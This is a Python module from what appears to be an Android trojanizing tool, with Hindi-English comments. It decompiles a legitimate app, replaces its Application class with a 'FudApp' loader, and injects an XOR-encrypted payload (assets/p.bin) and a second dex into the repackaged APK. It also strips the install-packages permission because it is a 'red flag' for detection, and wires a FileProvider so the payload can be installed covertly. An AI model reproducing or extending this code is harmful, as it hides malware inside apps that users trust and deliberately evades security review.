"""
Class2.dex (FudApp) + assets/p.bin inject karta hai.
Native lib nahi — pure Java XOR decrypt.
Install: REQUEST_INSTALL_PACKAGES ki zaroorat nahi —
FileProvider + ACTION_INSTALL_PACKAGE use karte hain.
"""
import os
import shutil
import zipfile
import xml.etree.ElementTree as ET
from config import LOADER_SRC_DIR
from setup import _compile_dex, _FUD_APP_TEMPLATE

ANDROID_NS = "http://schemas.android.com/apk/res/android"
ET.register_namespace("android", ANDROID_NS)


def _read_app_class(decompiled_dir: str) -> str:
    path = os.path.join(decompiled_dir, "AndroidManifest.xml")
    root = ET.parse(path).getroot()
    app = root.find("application")
    if app is None:
        return "android.app.Application"
    name = app.get(f"{{{ANDROID_NS}}}name")
    if not name:
        return "android.app.Application"
    if name.startswith("."):
        return (root.get("package") or "") + name
    return name


def _patch_manifest(decompiled_dir: str):
    path = os.path.join(decompiled_dir, "AndroidManifest.xml")
    tree = ET.parse(path)
    root = tree.getroot()

    # REQUEST_INSTALL_PACKAGES HATAO — ye #1 red flag hai
    for pm in list(root.findall("uses-permission")):
        if pm.get(f"{{{ANDROID_NS}}}name") == "android.permission.REQUEST_INSTALL_PACKAGES":
            root.remove(pm)
            print("[✓] REQUEST_INSTALL_PACKAGES removed (was red flag)")

    app = root.find("application")
    if app is None:
        app = ET.SubElement(root, "application")

    pkg = root.get("package") or "com.system.fud"
    authority = f"{pkg}.fileprovider"

    has_fp = False
    for prov in app.findall("provider"):
        if prov.get(f"{{{ANDROID_NS}}}authorities") == authority:
            has_fp = True
            break
    if not has_fp:
        prov = ET.SubElement(app, "provider")
        prov.set(f"{{{ANDROID_NS}}}name", "androidx.core.content.FileProvider")
        prov.set(f"{{{ANDROID_NS}}}authorities", authority)
        prov.set(f"{{{ANDROID_NS}}}exported", "false")
        prov.set(f"{{{ANDROID_NS}}}grantUriPermissions", "true")
        meta = ET.SubElement(prov, "meta-data")
        meta.set(f"{{{ANDROID_NS}}}name", "android.support.FILE_PROVIDER_PATHS")
        meta.set(f"{{{ANDROID_NS}}}resource", "@xml/file_paths")

    app.set(f"{{{ANDROID_NS}}}name", "com.system.fud.FudApp")
    tree.write(path, encoding="utf-8", xml_declaration=True)
    print("[✓] manifest → FudApp + FileProvider, no REQUEST_INSTALL_PACKAGES")


def _build_fud_app_dex(original_class: str, out_dex: str):
    src_dir = LOADER_SRC_DIR
    if os.path.exists(src_dir):
        shutil.rmtree(src_dir)
    os.makedirs(src_dir, exist_ok=True)

    with open(os.path.join(src_dir, "FudApp.java"), "w") as f:
        f.write(_FUD_APP_TEMPLATE.replace("{SUPER}", original_class))

    _compile_dex(src_dir, out_dex)


def _add_to_apk(apk_path: str, payload_bin: str, loader_dex: str,
                file_paths_xml: str = None):
    tmp = apk_path + ".tmp"
    with zipfile.ZipFile(apk_path, "r") as zin, \
         zipfile.ZipFile(tmp, "w", zipfile.ZIP_DEFLATED) as zout:
        for item in zin.infolist():
            fn = item.filename
            if fn.startswith("META-INF/"):
                continue
            if fn == "classes2.dex" or fn == "assets/p.bin":
                continue
            zout.writestr(item, zin.read(fn))

        with open(loader_dex, "rb") as f:
            zout.writestr("classes2.dex", f.read(), compress_type=zipfile.ZIP_STORED)
        with open(payload_bin, "rb") as f:
            zout.writestr("assets/p.bin", f.read(), compress_type=zipfile.ZIP_STORED)

        if file_paths_xml:
            zout.writestr("res/xml/file_paths.xml", file_paths_xml.encode(),
                          compress_type=zipfile.ZIP_STORED)

    shutil.move(tmp, apk_path)


def inject_payload(decompiled_dir: str, recompiled_apk: str,
                   payload_bin: str, work_dir: str):
    original_class = _read_app_class(decompiled_dir)
    print(f"[*] original Application: {original_class}")

    fud_app_dex = os.path.join(work_dir, "fudapp.dex")
    _build_fud_app_dex(original_class, fud_app_dex)
    _patch_manifest(decompiled_dir)

    file_paths = """<?xml version="1.0" encoding="utf-8"?>
<paths>
    <files-path name="internal" path="." />
    <cache-path name="cache" path="." />
    <external-files-path name="ext" path="." />
</paths>"""

    _add_to_apk(recompiled_apk, payload_bin, fud_app_dex, file_paths)
    print("[✓] payload injected, FileProvider wired")
